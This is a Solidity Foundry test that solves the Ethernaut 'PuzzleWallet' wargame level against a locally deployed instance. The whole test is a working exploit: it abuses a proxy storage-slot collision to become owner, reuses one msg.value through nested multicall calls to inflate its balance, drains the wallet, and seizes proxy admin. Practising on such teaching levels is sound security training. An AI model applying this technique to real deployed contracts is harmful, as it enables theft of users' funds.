//SPDX-Lincense-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is DSTest {
    Vm vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    address attacker = address(0xbabe);

    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testPuzzleWalletHack() public {
        //LEVEL SETUP
        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        
       
        (address proxyAddress ,address levelAddress) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleWallet puzzleWalletContract = PuzzleWallet(payable(levelAddress));
        PuzzleProxy puzzleProxyContract =  PuzzleProxy(payable(proxyAddress));
        vm.startPrank(attacker);

        

        //LEVEL ATTACK

        //Become PendingAdmin/Owner
       puzzleProxyContract.proposeNewAdmin(attacker);
       emit log_address(puzzleWalletContract.owner());

       //Get Whitelisted
       puzzleWalletContract.addToWhitelist(attacker); 
        //emit IsTrue(puzzleWalletContract.whitelisted(attacker));
       
       //Increase msg.senders balance without increasing contract balance
       //Do several calls to deposit using the same msg.value
       puzzleWalletContract.multicall{value:1 ether}(multicallData);

       //Withdraw more than you deposited and drain contract
       puzzleWalletContract.execute(attacker, 2 ether, bytes(""));

       //set max balance/ admin
       //first check admin is not the same as attacker
       assertTrue((puzzleProxyContract.admin() != attacker));
       puzzleWalletContract.setMaxBalance(uint256(uint160(attacker)));



       
       
        //LEVEL SUBMISSION
        
        assertTrue((puzzleProxyContract.admin() == attacker));
        vm.stopPrank();
    } 
    
}
